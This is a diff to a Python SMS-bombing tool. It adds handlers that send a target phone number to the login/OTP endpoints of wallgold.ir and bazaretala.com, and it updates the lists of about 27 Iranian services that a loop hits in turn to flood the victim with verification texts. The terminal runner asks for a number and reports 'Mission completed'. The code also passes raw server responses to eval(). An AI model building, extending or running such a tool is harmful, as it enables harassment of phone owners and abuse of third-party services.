@@ -678,50 +678,69 @@ class SMS_Api:
         def getJSON() -> dict:
             return {"mobile": "09214065420","device_info": {"brand": "","model": "","browserVersion": "131.0.0.0","app_version": "","by": "web","osName": "Windows","osVersion": "10","browserName": "Chrome","platform": "web","name": "Windows","device": "web"},"otp_type": "sms","device": "web"}
 
+    class wallgold:
+        def sendSMS(phoneNumber:str_without98and0) -> str:
+            phoneNumber="0"+phoneNumber
+            _json={"mobileNumber": phoneNumber,"deviceName": "web"}
+            _url="https://api.wallgold.ir/api/auth/login-signup"
+            req=requests.post(url=_url,json=_json)
+            try:
+                status=True if eval(req.text)["success"]==true else False
+            except:
+                status=False
+            return req.text,status
+        def getURL() -> str:
+            return "https://api.wallgold.ir/api/auth/login-signup"
+        def getJSON() -> dict:
+            return {"mobileNumber": "09XXXXXXXXX","deviceName": "web"}
+
+    class bazaretala:
+        def sendSMS(phoneNumber:str_without98and0) -> str:
+            phoneNumber="0"+phoneNumber
+            _json={"username": phoneNumber,"isRegister": 1}
+            _url="https://bazaretala.com/login/?sendOTPCode=1"
+            req=requests.post(url=_url,data=_json)
+            try:
+                status=True if eval(req.text)["status"]==1 else False
+            except:
+                status=False
+            return req.text,status
+        def getURL() -> str:
+            return "https://bazaretala.com/login/?sendOTPCode=1"
+        def getJSON() -> dict:
+            return {"username": '09XXXXXXXXX',"isRegister": 1}
+
     class run:
                                 
         def oneTime(phoneNumber:str_without98and0) -> str:
-            classes=["snapp",
-                "divar",
-                "digikala",
-                "behtarino",
-                "snappLink",
-                "football360",
-                "bargheman",
-                "bazar",
-                "ostadkar",
-                "telewebion",
-                "torob",
-                "karnameh",
-                "alibaba",
-                "okala",
-                "zhaket",
-                "iranecar",
-                "anten",
-                "tapsi",
-                "esam",
-                "banimode",
-                "idpay",
-                "nobat",
-                "basalam",
-                "azkivam",
-                "vitrin",
-                "shab",
-                "snapptrip",
-                "shavaz",
-                "jabama",
-                "takhfifan",
-                "tapsiShop",
-                "melico",
-                "neshan",
-                "drnext",
-                "karabiz",
-                "balad",
-                "mohit",
-                "ibime",
-                "erythron",
-                "tetherland"
-                ]
+            classes=["divar",
+      "behtarino",
+      "snappLink",
+      "bargheman",
+      "bazar",
+      "torob",
+      "iranecar",
+      "anten",
+      "tapsi",
+      "banimode",
+      "azkivam",
+      "vitrin",
+      "shab",
+      "snapptrip",
+      "shavaz",
+      "jabama",
+      "tapsiShop",
+      "melico",
+      "neshan",
+      "drnext",
+      "karabiz",
+      "balad",
+      "mohit",
+      "ibime",
+      "erythron",
+      "wallgold",
+      "bazaretala"
+      ]
             output=""
             for i in classes:
                 try:
@@ -735,20 +754,8 @@ class SMS_Api:
                     output+= i + " was error\n"
                     output+=","
             return output
-
-        def run(phoneNumber:str_without98and0,times:int):
-            output=""
-            for i in range(times):
-                output+=SMS_Api.run.oneTime(phoneNumber)
-            return output
     
         def runInTerminal():
-            print(Fore.GREEN+"Check internet connection...")
-            time.sleep(1)
-            print(Fore.GREEN + "Check server activity...")
-            time.sleep(1)
-            print(Style.RESET_ALL)
-            os.system("cls")
             def bar(smsSent,sms,output):
                 os.system("cls")
                 percent = (smsSent / sms) * 100
@@ -764,47 +771,34 @@ class SMS_Api:
                     print("\nMission completed...")
                 sys.stdout.flush()
                 time.sleep(0.1)
-            webs=["snapp",
-                "divar",
-                "digikala",
-                "behtarino",
-                "snappLink",
-                "football360",
-                "bargheman",
-                "bazar",
-                "ostadkar",
-                "telewebion",
-                "torob",
-                "karnameh",
-                "alibaba",
-                "okala",
-                "zhaket",
-                "iranecar",
-                "anten",
-                "tapsi",
-                "esam",
-                "banimode",
-                "idpay",
-                "nobat",
-                "basalam",
-                "azkivam",
-                "vitrin",
-                "shab",
-                "snapptrip",
-                "shavaz",
-                "jabama",
-                "takhfifan",
-                "tapsiShop",
-                "melico",
-                "neshan",
-                "drnext",
-                "karabiz",
-                "balad",
-                "mohit",
-                "ibime",
-                "erythron",
-                "tetherland"
-                ]
+            webs=["divar",
+                    "behtarino",
+                    "snappLink",
+                    "bargheman",
+                    "bazar",
+                    "torob",
+                    "iranecar",
+                    "anten",
+                    "tapsi",
+                    "banimode",
+                    "azkivam",
+                    "vitrin",
+                    "shab",
+                    "snapptrip",
+                    "shavaz",
+                    "jabama",
+                    "tapsiShop",
+                    "melico",
+                    "neshan",
+                    "drnext",
+                    "karabiz",
+                    "balad",
+                    "mohit",
+                    "ibime",
+                    "erythron",
+                    "wallgold",
+                    "bazaretala"
+                    ]
             active_webs=[]
             os.system("cls")
             phone=input("Enter phone number:")
@@ -830,5 +824,6 @@ class SMS_Api:
                     else:
                         break
                 webs=active_webs
+                active_webs=[]
             print(Style.RESET_ALL)
 
